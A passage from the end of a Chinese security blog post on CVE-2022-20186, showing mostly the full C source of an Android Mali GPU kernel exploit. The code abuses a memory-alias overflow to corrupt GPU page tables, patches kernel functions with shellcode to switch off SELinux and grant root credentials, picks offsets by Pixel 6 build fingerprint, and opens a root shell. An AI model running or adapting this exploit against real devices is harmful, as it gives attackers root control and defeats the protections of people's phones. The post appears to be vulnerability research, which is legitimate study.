class="number">8</span>, &amp;payload);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span>* section = (<span class="type">uint32_t</span>*)jc_region;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">base_jd_atom_v2</span> <span class="title">atom</span> =</span> {<span class="number">0</span>};</span><br><span class="line">  atom.jc = (<span class="type">uint64_t</span>)jc_region;</span><br><span class="line">  atom.atom_number = atom_number;</span><br><span class="line">  atom.core_req = BASE_JD_REQ_CS;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kbase_ioctl_job_submit</span> <span class="title">submit</span> =</span> {<span class="number">0</span>};</span><br><span class="line">  submit.addr = (<span class="type">uint64_t</span>)(&amp;atom);</span><br><span class="line">  submit.nr_atoms = <span class="number">1</span>;</span><br><span class="line">  submit.stride = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> base_jd_atom_v2);</span><br><span class="line">  <span class="keyword">if</span> (ioctl(mali_fd, KBASE_IOCTL_JOB_SUBMIT, &amp;submit) &lt; <span class="number">0</span>) {</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"submit job failed\n"</span>);</span><br><span class="line">  }</span><br><span class="line">  usleep(<span class="number">10000</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">drain_mem_pool</span><span class="params">(<span class="type">int</span> mali_fd)</span> {</span><br><span class="line">  <span class="keyword">return</span> map_gpu(mali_fd, POOL_SIZE, <span class="literal">false</span>, <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">release_mem_pool</span><span class="params">(<span class="type">void</span>* drain)</span> {</span><br><span class="line">  munmap(drain, POOL_SIZE * <span class="number">0x1000</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1.	reserve_pages 函数：</span></span><br><span class="line"><span class="comment">	    向 GPU 驱动请求分配 nents 个内存块，每个内存块包含 pages 页，并记录返回的 GPU 虚拟地址。</span></span><br><span class="line"><span class="comment">	2.	map_reserved 函数：</span></span><br><span class="line"><span class="comment">	    将这些分配的内存块映射到用户进程的虚拟地址空间，并更新 reserved_va 存储用户空间地址。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">reserve_pages</span><span class="params">(<span class="type">int</span> mali_fd, <span class="type">int</span> pages, <span class="type">int</span> nents, <span class="type">uint64_t</span>* reserved_va)</span> {</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nents; i++) {</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">kbase_ioctl_mem_alloc</span> <span class="title">alloc</span> =</span> {<span class="number">0</span>};</span><br><span class="line">    alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR | (<span class="number">1</span> &lt;&lt; <span class="number">22</span>);</span><br><span class="line">    <span class="type">int</span> prot = PROT_READ | PROT_WRITE;</span><br><span class="line">    alloc.in.va_pages = pages;</span><br><span class="line">    alloc.in.commit_pages = pages;</span><br><span class="line">    mem_alloc(mali_fd, &amp;alloc);</span><br><span class="line">    reserved_va[i] = alloc.out.gpu_va;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">map_reserved</span><span class="params">(<span class="type">int</span> mali_fd, <span class="type">int</span> pages, <span class="type">int</span> nents, <span class="type">uint64_t</span>* reserved_va)</span> {</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nents; i++) {</span><br><span class="line">    <span class="type">void</span>* reserved = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span> * pages, PROT_READ | PROT_WRITE, MAP_SHARED, mali_fd, reserved_va[i]);</span><br><span class="line">    <span class="keyword">if</span> (reserved == MAP_FAILED) {</span><br><span class="line">      err(<span class="number">1</span>, <span class="string">"mmap reserved failed"</span>);</span><br><span class="line">    }</span><br><span class="line">    reserved_va[i] = (<span class="type">uint64_t</span>)reserved;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">set_addr_lv3</span><span class="params">(<span class="type">uint64_t</span> addr)</span> {</span><br><span class="line">  <span class="type">uint64_t</span> pfn = addr &gt;&gt; PAGE_SHIFT;</span><br><span class="line">  pfn &amp;= ~ <span class="number">0x1FF</span>UL;</span><br><span class="line">  pfn |= <span class="number">0x100</span>UL;</span><br><span class="line">  <span class="keyword">return</span> pfn &lt;&lt; PAGE_SHIFT;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint64_t</span> <span class="title function_">compute_pt_index</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">int</span> level)</span> {</span><br><span class="line">  <span class="type">uint64_t</span> vpfn = addr &gt;&gt; PAGE_SHIFT;</span><br><span class="line">  vpfn &gt;&gt;= (<span class="number">3</span> - level) * <span class="number">9</span>;</span><br><span class="line">  <span class="keyword">return</span> vpfn &amp; <span class="number">0x1FF</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_func</span><span class="params">(<span class="type">int</span> mali_fd, <span class="type">uint64_t</span> func, <span class="type">uint64_t</span>* reserved, <span class="type">uint64_t</span> size, <span class="type">uint32_t</span>* shellcode, <span class="type">uint64_t</span> code_size)</span> {</span><br><span class="line">  <span class="type">uint64_t</span> func_offset = (func + KERNEL_BASE) % <span class="number">0x1000</span>;</span><br><span class="line">  <span class="type">uint64_t</span> curr_overwrite_addr = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) {</span><br><span class="line">    <span class="type">uint64_t</span> base = reserved[i];</span><br><span class="line">    <span class="type">uint64_t</span> end = reserved[i] + RESERVED_SIZE * <span class="number">0x1000</span>;</span><br><span class="line">    <span class="type">uint64_t</span> start_idx = compute_pt_index(base, <span class="number">3</span>);</span><br><span class="line">    <span class="type">uint64_t</span> end_idx = compute_pt_index(end, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint64_t</span> addr = base; addr &lt; end; addr += <span class="number">0x1000</span>) {</span><br><span class="line">      <span class="type">uint64_t</span> overwrite_addr = set_addr_lv3(addr);</span><br><span class="line">      <span class="keyword">if</span> (curr_overwrite_addr != overwrite_addr) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"overwrite addr : %lx %lx\n"</span>, overwrite_addr + func_offset, func_offset);</span><br><span class="line">        curr_overwrite_addr = overwrite_addr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> code = code_size - <span class="number">1</span>; code &gt;= <span class="number">0</span>; code--) {</span><br><span class="line">          write_to(mali_fd, overwrite_addr + func_offset + code * <span class="number">4</span>, shellcode[code], atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_32);</span><br><span class="line">        }</span><br><span class="line">        usleep(<span class="number">300000</span>);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">run_enforce</span><span class="params">()</span> {</span><br><span class="line">  <span class="type">char</span> result = <span class="string">'2'</span>;</span><br><span class="line">  sleep(<span class="number">3</span>);</span><br><span class="line">  <span class="type">int</span> enforce_fd = open(<span class="string">"/sys/fs/selinux/enforce"</span>, O_RDONLY);</span><br><span class="line">  read(enforce_fd, &amp;result, <span class="number">1</span>);</span><br><span class="line">  close(enforce_fd);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"result %d\n"</span>, result);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">select_offset</span><span class="params">()</span> {</span><br><span class="line">  <span class="type">char</span> fingerprint[<span class="number">256</span>];</span><br><span class="line">  <span class="type">int</span> len = __system_property_get(<span class="string">"ro.build.fingerprint"</span>, fingerprint);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"fingerprint: %s\n"</span>, fingerprint);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(fingerprint, <span class="string">"google/oriole/oriole:12/SD1A.210817.037/7862242:user/release-keys"</span>)) {</span><br><span class="line">    avc_deny = AVC_DENY_2108;</span><br><span class="line">    sel_read_enforce = SEL_READ_ENFORCE_2108;</span><br><span class="line">    fixup_root_shell(INIT_CRED_2108, COMMIT_CREDS_2108, SEL_READ_ENFORCE_2108, ADD_INIT_2108, ADD_COMMIT_2108);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(fingerprint, <span class="string">"google/oriole/oriole:12/SQ1D.220105.007/8030436:user/release-keys"</span>)) {</span><br><span class="line">    avc_deny = AVC_DENY_2201;</span><br><span class="line">    sel_read_enforce = SEL_READ_ENFORCE_2201;</span><br><span class="line">    fixup_root_shell(INIT_CRED_2201, COMMIT_CREDS_2201, SEL_READ_ENFORCE_2201, ADD_INIT_2201, ADD_COMMIT_2201);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(fingerprint, <span class="string">"google/oriole/oriole:12/SQ1D.220205.004/8151327:user/release-keys"</span>)) {</span><br><span class="line">    avc_deny = AVC_DENY_2202;</span><br><span class="line">    sel_read_enforce = SEL_READ_ENFORCE_2202;</span><br><span class="line">    fixup_root_shell(INIT_CRED_2202, COMMIT_CREDS_2202, SEL_READ_ENFORCE_2202, ADD_INIT_2202, ADD_COMMIT_2202);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">  err(<span class="number">1</span>, <span class="string">"unable to match build id\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//Clean up pagetable</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup</span><span class="params">(<span class="type">int</span> mali_fd, <span class="type">uint64_t</span> gpu_va, <span class="type">uint64_t</span>* reserved, <span class="type">size_t</span> reserved_size)</span> {</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) {</span><br><span class="line">    write_to(mali_fd, gpu_va + i * <span class="number">0x1000</span> + OVERWRITE_INDEX * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>), <span class="number">2</span>, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">run_exploit</span><span class="params">()</span> {</span><br><span class="line">	<span class="type">uint64_t</span> gpu_va[<span class="number">3</span>];</span><br><span class="line">	<span class="type">uint64_t</span> alias_va;</span><br><span class="line">	<span class="type">uint64_t</span> reserved_va[TOTAL_RESERVED_SIZE/RESERVED_SIZE];</span><br><span class="line">	<span class="type">int</span> mali_fd = open_dev(MALI);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//init environment</span></span><br><span class="line">	setup_mali(mali_fd);</span><br><span class="line">	setup_tracking_page(mali_fd);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//reserve_va for spraying pgd from next_pool</span></span><br><span class="line">	reserve_pages(mali_fd, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, reserved_va);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//try to drain mem_pool</span></span><br><span class="line">	<span class="type">void</span>* pool_region = drain_mem_pool(mali_fd);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"mem_pool has been drained.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//mem_alloc 2 mapping area</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++){</span><br><span class="line">		gpu_va[i] = (<span class="type">uint64_t</span>)map_gpu(mali_fd, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"gpu_va[i] == %lx\n"</span>, gpu_va[i]);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="comment">//mem_alias to trigger vulnerability</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">kbase_ioctl_mem_alias</span> <span class="title">alias</span> =</span> {<span class="number">0</span>};</span><br><span class="line">  alias.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;</span><br><span class="line">  alias.in.stride = <span class="number">9223372036854775808ull</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  alias.in.nents = <span class="number">2</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">base_mem_aliasing_info</span> <span class="title">ai</span>[2];</span></span><br><span class="line">  ai[<span class="number">0</span>].handle.basep.handle = gpu_va[<span class="number">0</span>];</span><br><span class="line">  ai[<span class="number">1</span>].handle.basep.handle = gpu_va[<span class="number">0</span>];</span><br><span class="line">  ai[<span class="number">0</span>].length = <span class="number">0x3</span>;</span><br><span class="line">  ai[<span class="number">1</span>].length = <span class="number">0x3</span>;</span><br><span class="line">  ai[<span class="number">0</span>].offset = <span class="number">0</span>;</span><br><span class="line">  ai[<span class="number">1</span>].offset = <span class="number">0</span>;</span><br><span class="line">  alias.in.aliasing_info = (<span class="type">uint64_t</span>)(&amp;(ai[<span class="number">0</span>]));</span><br><span class="line">  mem_alias(mali_fd, &amp;alias);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"alias.out.gpu_va == %lx\n"</span>, (<span class="type">size_t</span>)alias.out.gpu_va);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"alias.out.va_pages == %lx\n"</span>, (<span class="type">size_t</span>)alias.out.va_pages);</span><br><span class="line">  <span class="type">void</span>* alias_region = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ, MAP_SHARED, mali_fd, alias.out.gpu_va);</span><br><span class="line">  <span class="keyword">if</span> (alias_region == MAP_FAILED) {</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"mmap failed"</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">	munmap(alias_region, <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//release mem_pool to make mem_pool full</span></span><br><span class="line">	release_mem_pool(pool_region);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"mem_pool has been released to make sure mem_pool state is full.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//munmap gpu_va[0] &amp; alias_gpu_va to release area to next_pool where pgd get space from here	</span></span><br><span class="line">	munmap((<span class="type">void</span> *)gpu_va[<span class="number">0</span>], <span class="number">0x3000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"munmap UAF page to next_pool.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//alloc page from next_pool where UAF page just was freed for pgd</span></span><br><span class="line">	map_reserved(mali_fd, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, reserved_va);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"try to alloc pgd from next_pool.\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Writing to gpu_va[1] will now overwrite the level 3 pgd in one of the reserved pages mapped earlier.</span></span><br><span class="line">	<span class="type">uint64_t</span> avc_deny_addr = (((avc_deny + KERNEL_BASE) &gt;&gt; PAGE_SHIFT) &lt;&lt; PAGE_SHIFT)| <span class="number">0x443</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) {</span><br><span class="line">    write_to(mali_fd, gpu_va[<span class="number">1</span>] + i * <span class="number">0x1000</span> + OVERWRITE_INDEX * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>), avc_deny_addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  usleep(<span class="number">100000</span>);</span><br><span class="line">  <span class="comment">//Go through the reserve pages addresses to write to sel_read_enforce with our own shellcode</span></span><br><span class="line">  write_func(mali_fd, avc_deny, &amp;(reserved_va[<span class="number">0</span>]), TOTAL_RESERVED_SIZE/RESERVED_SIZE, &amp;(permissive[<span class="number">0</span>]), <span class="keyword">sizeof</span>(permissive)/<span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Triggers avc_deny to disable SELinux</span></span><br><span class="line">  open(<span class="string">"/dev/kmsg"</span>, O_RDONLY);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Triggers avc_deny to disable SELinux.\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> sel_read_enforce_addr = (((sel_read_enforce + KERNEL_BASE) &gt;&gt; PAGE_SHIFT) &lt;&lt; PAGE_SHIFT)| <span class="number">0x443</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Writing to gpu_va[1] will now overwrite the level 3 pgd in one of the reserved pages mapped earlier.</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) {</span><br><span class="line">    write_to(mali_fd, gpu_va[<span class="number">1</span>] + i * <span class="number">0x1000</span> + OVERWRITE_INDEX * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>), sel_read_enforce_addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Call commit_creds to overwrite process credentials to gain root</span></span><br><span class="line">  write_func(mali_fd, sel_read_enforce, &amp;(reserved_va[<span class="number">0</span>]), TOTAL_RESERVED_SIZE/RESERVED_SIZE, &amp;(root_code[<span class="number">0</span>]), <span class="keyword">sizeof</span>(root_code)/<span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line"></span><br><span class="line">  run_enforce();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"try to gain root...\n"</span>);</span><br><span class="line"></span><br><span class="line">  cleanup(mali_fd, gpu_va[<span class="number">1</span>], &amp;(reserved_va[<span class="number">0</span>]), TOTAL_RESERVED_SIZE/RESERVED_SIZE);</span><br><span class="line">  usleep(<span class="number">100000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  select_offset();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">  ret = run_exploit();</span><br><span class="line">  <span class="keyword">if</span> (!ret) system(<span class="string">"sh"</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>







<p><strong>Reference:</strong></p>
<p><a class="link" target="_blank" rel="noopener" href="https://github.blog/security/vulnerability-research/corrupting-memory-without-memory-corruption/">https://github.blog/security/vulnerability-research/corrupting-memory-without-memory-corruption/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>

        </div>

        
            <div class="post-copyright-info my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> CVE-2022-20186 mali gpu	漏洞利用</li>
        <li><strong>Author:</strong> henry</li>
        <li><strong>Created at
                :</strong> 2024-12-02 16:59:07</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-12-02 17:07:08
            </li>
        
        <li>
            <strong>Link:</strong> https://henrymartin262.github.io/2024/12/02/CVE-2022-20186/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box">
                
                    <li class="tag-item">
                        <a href="/tags/mali/">#mali</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/android-gpu/">#android gpu</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/mem-alloc/">#mem_alloc</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/mem-alias/">#mem_alias</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2024/12/11/codeql_note/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">codeql_zero_to_hero 学习</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2024/11/17/LLM_security/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">LLM Attack Methods</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container pjax">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fa-solid fa-comments"></i>&nbsp;Comments
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.mjs';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://example.example.com',
          lang: 'zh-CN',
          dark: 'body[class~="dark-mode"]',
          requiredMeta: ['nick', 'mail']
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">CVE-2022-20186 mali gpu	漏洞利用</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2022-20186-mali-gpu%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">CVE-2022-20186 mali gpu	漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Memory-management-in-the-Mali-kernel-driver"><span class="nav-text">Memory management in the Mali kernel driver</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Mapping-pages-to-user-space"><span class="nav-text">Mapping pages to user space</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mapping-pages-to-the-GPU"><span class="nav-text">Mapping pages to the GPU</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Memory-alias"><span class="nav-text">Memory alias</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vulnerability"><span class="nav-text">Vulnerability</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#explain-exp"><span class="nav-text">explain exp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#write-adrp"><span class="nav-text">write_adrp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#map-gpu"><span class="nav-text">map_gpu</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#write-func"><span class="nav-text">write_func</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Final-exp"><span class="nav-text">Final exp</span></a></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">henry</a>
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.6</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

